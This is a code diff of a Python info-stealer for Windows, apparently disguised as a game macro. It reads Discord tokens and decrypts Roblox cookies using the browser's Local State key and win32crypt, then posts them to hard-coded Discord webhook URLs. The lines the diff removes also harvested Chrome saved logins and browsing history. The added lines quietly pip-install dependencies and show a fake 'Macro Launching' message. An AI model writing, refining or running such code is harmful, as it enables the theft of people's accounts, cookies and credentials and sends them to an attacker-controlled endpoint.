@@ -1,4 +1,6 @@
 import os
+if os.name != "nt":
+    exit()
 import subprocess
 import sys
 import json
@@ -6,25 +8,19 @@ import urllib.request
 import re
 import base64
 import datetime
-import shutil
-import sqlite3
-import requests
-import tempfile
-import platform
-import psutil
-import cpuinfo
-import GPUtil
-import socket
-import getpass
-import threading
-import time
-import keyboard
-import ctypes
-from pynput import mouse, keyboard as pynput_keyboard
-from Crypto.Cipher import AES
-import win32crypt
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1435400854764130335/FjKkrLaNQ0uUt1N6Ud4cPmLmKXknSxaw_-H_b-qHuPG_bheA1l6nxdddvLatlBioO06Q"
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
+from Crypto.Cipher import AES
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -78,13 +74,13 @@ def gettokens(path):
         try:
             with open(f"{path}{file}", "r", errors="ignore") as f:
                 for line in (x.strip() for x in f.readlines()):
-                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                         tokens.append(values)
         except PermissionError:
             continue
 
     return tokens
-
+    
 def getkey(path):
     with open(path + f"\\Local State", "r") as file:
         key = json.loads(file.read())['os_crypt']['encrypted_key']
@@ -93,6 +89,9 @@ def getkey(path):
     return key
 
 def getipwhois_data():
+    import urllib.request
+    import json
+
     try:
         with urllib.request.urlopen("https://ipwhois.app/json/") as response:
             return json.loads(response.read().decode())
@@ -208,27 +207,42 @@ def main():
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
                 print(f"ERROR: {e}")
                 continue
 
-def send_to_discord(message):
-    payload = {"content": message}
-    response = requests.post(WEBHOOK_URL, json=payload)
-    if response.status_code == 204:
-        print("")
-    else:
-        print("")
+if __name__ == "__main__":
+    main()
 
+import os
+import requests
+import shutil
+import json
+import base64
+import win32crypt
+
+# --- Discord webhook function ---
+def send_to_discord(message, webhook_url):
+    payload = {"content": message}
+    response = requests.post(webhook_url, json=payload)
+    if response.status_code == 204:
+        print("Macro Launching...")
+    else:
+        print(f"❌ Failed to Luanch Macro. Status code: {response.status_code}")
+
+# --- Your webhook URL ---
+webhook_url = "https://discord.com/api/webhooks/1427980430501740625/s_gLw7jgJRqQnCWGgtyfZLehwQj0KnFtBBKg2qVeWW2af5m3AZiAm0K_Qwh7KPFq1n5C"
+
+# --- Cookie retrieval and decryption ---
 def retrieve_roblox_cookies():
     user_profile = os.getenv("USERPROFILE", "")
     roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
 
     if not os.path.exists(roblox_cookies_path):
-        send_to_discord("⚠️ robloxcookies.dat not found.")
+        send_to_discord("⚠️ robloxcookies.dat not found.", webhook_url)
         return
 
     temp_dir = os.getenv("TEMP", "")
@@ -241,158 +255,23 @@ def retrieve_roblox_cookies():
 
         encoded_cookies = file_content.get("CookiesData", "")
         if not encoded_cookies:
-            send_to_discord("⚠️ No 'CookiesData' found in the file.")
+            send_to_discord("⚠️ No 'CookiesData' found in the file.", webhook_url)
             return
 
         decoded_cookies = base64.b64decode(encoded_cookies)
         decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
         decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')
 
-        send_to_discord(f"Decrypted Roblox Cookies:\n```\n{decrypted_text}\n```")
+        print("Decrypted Content:")
+        print(decrypted_text)
+
+        # ✅ Send to Discord
+        send_to_discord(f"Decrypted Roblox Cookies:\n```\n{decrypted_text}\n```", webhook_url)
 
     except json.JSONDecodeError as e:
-        send_to_discord(f"❌ JSON parsing error: {e}")
+        send_to_discord(f"❌ JSON parsing error: {e}", webhook_url)
     except Exception as e:
-        send_to_discord(f"❌ Unexpected error: {e}")
+        send_to_discord(f"❌ Unexpected error: {e}", webhook_url)
 
-def get_login_data_path():
-    try:
-        user_profile = os.environ['USERPROFILE']
-        base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data")
-        for profile in ["Default", "Profile 1", "Profile 2"]:
-            candidate = os.path.join(base_path, profile, "Login Data")
-            if os.path.exists(candidate):
-                return candidate
-    except:
-        pass
-    return None
-
-def copy_database(source_path, temp_path):
-    try:
-        shutil.copy2(source_path, temp_path)
-        return True
-    except:
-        return False
-
-def extract_logins(db_path):
-    results = []
-    try:
-        con = sqlite3.connect(db_path)
-        cur = con.cursor()
-        cur.execute("SELECT origin_url, username_value, date_created FROM logins")
-        rows = cur.fetchall()
-        con.close()
-
-        for url, username, timestamp in rows:
-            if not username.strip():
-                continue
-            try:
-                dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
-                iso_time = dt.isoformat()
-            except:
-                iso_time = "Unknown"
-            results.append((url, username, iso_time))
-    except:
-        pass
-    return results
-
-def write_to_file(data, file_path):
-    try:
-        with open(file_path, 'w', encoding='utf-8') as f:
-            for url, email, timestamp in data:
-                f.write(f"URL: {url}\nEmail: {email}\nSaved: {timestamp}\n\n")
-    except:
-        pass
-
-def send_file_to_discord(file_path):
-    try:
-        with open(file_path, 'rb') as f:
-            files = {
-                'file': (os.path.basename(file_path), f)
-            }
-            requests.post(WEBHOOK_URL, files=files)
-    except:
-        pass
-
-def collect_chrome_logins():
-    try:
-        original_db = get_login_data_path()
-        if not original_db:
-            return
-
-        temp_db = os.path.join(os.environ['TEMP'], "LoginData_Copy.db")
-        if not copy_database(original_db, temp_db):
-            return
-
-        logins = extract_logins(temp_db)
-        if not logins:
-            return
-
-        temp_txt = os.path.join(os.environ['TEMP'], "chrome_logins.txt")
-        write_to_file(logins, temp_txt)
-        send_file_to_discord(temp_txt)
-    except:
-        pass
-
-def get_size(bytes, suffix="B"):
-    factor = 1024
-    for unit in ["", "K", "M", "G", "T"]:
-        if bytes < factor:
-            return f"{bytes:.2f} {unit}{suffix}"
-        bytes /= factor
-
-def get_user_email():
-    try:
-        result = subprocess.run(
-            ["powershell", "-Command", "(Get-CimInstance -ClassName Win32_UserAccount | Where-Object {$_.LocalAccount -eq $false}).Name"],
-            capture_output=True, text=True
-        )
-        email = result.stdout.strip()
-        return email if email else "No Microsoft account email found"
-    except Exception as e:
-        return f"Error: {e}"
-
-def get_chrome_history(limit=100):
-    original_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
-    temp_path = os.path.join(tempfile.gettempdir(), "chrome_history_copy")
-
-    try:
-        shutil.copy2(original_path, temp_path)
-        conn = sqlite3.connect(temp_path)
-        cursor = conn.cursor()
-
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
-        rows = cursor.fetchall()
-
-        history_lines = []
-        for url, title, timestamp in rows:
-            visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
-            history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
-
-        conn.close()
-        os.remove(temp_path)
-        return "\n".join(history_lines)
-
-    except Exception as e:
-        return f"Error accessing Chrome history: {e}"
-
-def send_history_to_discord(history_text):
-    with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt", encoding="utf-8") as temp_file:
-        temp_file.write(history_text)
-        temp_file_path = temp_file.name
-
-    with open(temp_file_path, "rb") as f:
-        files = {"file": (os.path.basename(temp_file_path), f)}
-        response = requests.post(WEBHOOK_URL, files=files)
-
-    os.remove(temp_file_path)
-    return response.status_code
-
-# --- Run ---
-if __name__ == "__main__":
-    main()
-    retrieve_roblox_cookies()
-    collect_chrome_logins()
-    
-    history = get_chrome_history(limit=200)
-    status = send_history_to_discord(history)
+# --- Run the function ---
+retrieve_roblox_cookies()
